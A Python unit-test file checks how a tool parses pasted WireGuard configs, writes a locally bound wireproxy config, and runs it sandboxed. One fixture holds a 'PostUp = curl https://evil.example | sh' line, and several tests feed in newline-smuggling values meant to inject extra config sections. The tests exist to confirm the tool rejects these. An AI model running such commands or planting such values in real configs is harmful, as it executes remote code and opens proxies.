"""WireGuard routes: what cilly keeps from a pasted .conf, the config it writes for wireproxy, and
the wireproxy it runs, with its key only in memory and its SOCKS5 port only on 127.0.0.1."""

import base64
import os
import stat
import sys
import tempfile
import time
import unittest
from unittest import mock

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from cilly import helpers as HP  # noqa: E402
from cilly import wireguard as W  # noqa: E402

PRIV, PUB, PSK = (base64.b64encode(bytes([n]) * 32).decode() for n in (1, 2, 3))

SELF_HOSTED = f"""# wg-easy, with the usual extras
[Interface]
PrivateKey = {PRIV}
Address = 10.8.0.2/24
DNS = 10.8.0.1, home.lan
MTU = 1420
PostUp = curl https://evil.example | sh

[Peer]
PublicKey = {PUB}
PresharedKey = {PSK}
AllowedIPs = 0.0.0.0/0, ::/0
PersistentKeepalive = 25
Endpoint = vpn.example.org:51820
"""

COMMERCIAL = f"""[Interface]
PrivateKey = {PRIV}  # a comment after a value
Address = 10.66.1.2/32,fc00:bbbb:bbbb:bb01::3:102/128
DNS = 10.64.0.1

[Peer]
PublicKey = {PUB}
AllowedIPs = 0.0.0.0/0,::/0
Endpoint = 185.65.134.82:51820
"""


class ParseTests(unittest.TestCase):
    def test_a_self_hosted_config(self):
        fields, keys, left_out = W.parse_conf(SELF_HOSTED)
        self.assertEqual(fields, {"kind": "wireguard", "address": ["10.8.0.2/24"], "dns": ["10.8.0.1"], "mtu": 1420,
                                  "public_key": PUB, "endpoint": "vpn.example.org:51820",
                                  "allowed_ips": ["0.0.0.0/0", "::/0"], "keepalive": 25})
        self.assertEqual(keys, f"{PRIV} {PSK}")  # for Secrets, never Settings
        self.assertEqual(left_out, ["postup", "dns home.lan"])  # never run
        self.assertNotIn(PRIV, repr(fields))

    def test_a_commercial_config(self):
        fields, keys, left_out = W.parse_conf(COMMERCIAL)
        self.assertEqual(fields["address"], ["10.66.1.2/32", "fc00:bbbb:bbbb:bb01::3:102/128"])
        self.assertEqual((fields["dns"], fields["endpoint"], keys, left_out), (["10.64.0.1"], "185.65.134.82:51820", PRIV, []))
        self.assertNotIn("mtu", fields)

    def test_what_it_refuses(self):
        bad = {
            "two peers": COMMERCIAL + f"\n[Peer]\nPublicKey = {PUB}\nEndpoint = a.example:1\n",
            "no peer": f"[Interface]\nPrivateKey = {PRIV}\nAddress = 10.0.0.2/32\n",
            "another section": COMMERCIAL + "\n[Socks5]\nBindAddress = 0.0.0.0:1080\n",
            "an unknown key": COMMERCIAL.replace("DNS =", "Exec ="),
            "a short key": COMMERCIAL.replace(PUB, base64.b64encode(b"x" * 16).decode()),
            "no private key": COMMERCIAL.replace(f"PrivateKey = {PRIV}  # a comment after a value\n", ""),
            "a bad endpoint": COMMERCIAL.replace("185.65.134.82:51820", "185.65.134.82:51820 extra"),
            "an endpoint without a port": COMMERCIAL.replace("185.65.134.82:51820", "185.65.134.82"),
            "a bad address": COMMERCIAL.replace("10.66.1.2/32", "10.66.1.300/32"),
            "not a config": "hello",
            "too long": COMMERCIAL + "#" * W.CONF_MAX,
        }
        for what, text in bad.items():
            with self.assertRaises(ValueError, msg=what):
                W.parse_conf(text)

    def test_the_wireproxy_config(self):
        fields, keys, _ = W.parse_conf(SELF_HOSTED)
        text = W.wireproxy_conf(fields, keys, 41234, "user_123456", "pass-1234567890")
        self.assertEqual(text, "\n".join([
            "[Interface]", f"PrivateKey = {PRIV}", "Address = 10.8.0.2/24", "DNS = 10.8.0.1", "MTU = 1420", "",
            "[Peer]", f"PublicKey = {PUB}", f"PresharedKey = {PSK}", "Endpoint = vpn.example.org:51820",
            "AllowedIPs = 0.0.0.0/0, ::/0", "PersistentKeepalive = 25", "",
            "[Socks5]", "BindAddress = 127.0.0.1:41234", "Username = user_123456", "Password = pass-1234567890", ""]))
        self.assertNotIn("PostUp", text)
        for user in ("short", "has space in it", "new\nline-1234"):
            with self.assertRaises(ValueError):
                W.wireproxy_conf(fields, keys, 41234, user, "pass-1234567890")
        with self.assertRaises(ValueError):  # Settings edited by hand: checked again here
            W.wireproxy_conf(dict(fields, endpoint="x.example:1\n[Socks5]"), keys, 41234, "user_123456", "pass-1234567890")
        for field, value in (("dns", ["fd00::1%x\n[TCPClientTunnel]\nBindAddress = 0.0.0.0:2222"]),
                             ("address", ["fd00::2%x\n[Socks5]/64"]), ("allowed_ips", ["fd00::%x\n/64"]), ("dns", ["fd00::1%eth0"])):
            with self.assertRaises(ValueError, msg=(field, value)):  # an IPv6 zone can hold anything, line breaks too
                W.wireproxy_conf(dict(fields, **{field: value}), keys, 41234, "user_123456", "pass-1234567890")


FAKE = """#!/bin/sh
echo "args: $@"
exec sleep 30
"""


class ProcessTests(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory(dir="/tmp")
        self.addCleanup(self.tmp.cleanup)
        self.fake = os.path.join(self.tmp.name, "wireproxy")
        with open(self.fake, "w") as f:
            f.write(FAKE)
        os.chmod(self.fake, 0o755)
        self.fields, self.keys, _ = W.parse_conf(SELF_HOSTED)
        self.run_dir, self.log_dir = os.path.join(self.tmp.name, "run"), os.path.join(self.tmp.name, "data")

    def test_it_runs_with_its_key_in_memory_and_a_local_login(self):
        wg = W.WireGuard(lambda: self.run_dir, lambda: self.log_dir, use_bwrap=lambda: "off")
        self.addCleanup(wg.stop)
        with mock.patch.object(W, "wireproxy_binary", lambda: self.fake):
            p = wg.ensure("office", self.fields, self.keys)
            end = time.time() + 5
            while not os.path.exists(p.log_path()) or not os.path.getsize(p.log_path()):
                self.assertLess(time.time(), end)
                time.sleep(0.05)
            self.assertTrue(p.running())
            self.assertEqual(stat.S_IMODE(os.stat(p.dir).st_mode), 0o700)
            self.assertEqual(stat.S_IMODE(os.stat(p.conf_path()).st_mode), 0o600)
            with open(p.conf_path()) as f:
                conf = f.read()
            self.assertIn(f"BindAddress = 127.0.0.1:{p.port}", conf)
            self.assertIn(f"Password = {p.password}", conf)
            with open(p.log_path()) as f:
                self.assertEqual(f.read().strip(), f"args: -c {p.conf_path()}")  # the key is not on the command line
            self.assertEqual(p.route(), {"kind": "socks5", "name": "office", "host": "127.0.0.1", "port": p.port,
                                         "user": p.user, "password": p.password, "dns": "10.8.0.1"})
            self.assertIs(wg.ensure("office", self.fields, self.keys), p)  # the same one, still running
            changed = wg.ensure("office", dict(self.fields, endpoint="vpn2.example.org:51820"), self.keys)
            self.assertIsNot(changed, p)  # a changed config gets a new one
            self.assertFalse(p.running())
            self.assertEqual(wg.status()["routes"], {"office": {"running": True, "error": None}})
        wg.stop("office")
        self.assertFalse(os.path.exists(changed.conf_path()))  # the key goes with it
        self.assertFalse(changed.running())

    def test_without_wireproxy(self):
        wg = W.WireGuard(lambda: self.run_dir, lambda: self.log_dir, use_bwrap=lambda: "off")
        with mock.patch.object(W, "wireproxy_binary", lambda: None):
            p = wg.ensure("office", self.fields, self.keys)
            self.assertEqual((p.running(), p.error), (False, "wireproxy isn't installed"))
            self.assertFalse(wg.status()["installed"])

    def test_in_bubblewrap_it_sees_its_program_and_folder_only(self):
        started = []

        class Proc:
            stdout, args = iter(()), None
            def poll(self): return None
            def wait(self, *a): return 0
        with mock.patch.object(W, "wireproxy_binary", lambda: self.fake), \
                mock.patch.object(HP.shutil, "which", lambda n: "/usr/bin/bwrap"), \
                mock.patch.object(HP.H, "bwrap_check", lambda *a, **kw: None), \
                mock.patch.object(HP.subprocess, "Popen", lambda argv, **kw: started.append(argv) or Proc()), \
                mock.patch.object(HP.threading, "Thread"):
            p = W.WireGuard(lambda: self.run_dir, lambda: self.log_dir).ensure("office", self.fields, self.keys)
        argv = started[0]
        self.assertEqual(argv[0], "/usr/bin/bwrap")
        self.assertIn("--share-net", argv)
        binds = [(argv[i], argv[i + 1]) for i, a in enumerate(argv) if a in ("--bind", "--ro-bind")]
        self.assertIn(("--bind", p.dir), binds)
        self.assertIn(("--ro-bind", os.path.realpath(self.fake)), binds)  # its program, outside /usr
        self.assertNotIn(("--bind", self.log_dir), binds)  # cilly writes its log, not wireproxy
        self.assertFalse(any(b[1] in ("/home", os.path.expanduser("~")) for b in binds))
        self.assertEqual(argv[-3:], [os.path.realpath(self.fake), "-c", p.conf_path()])


if __name__ == "__main__":
    unittest.main()
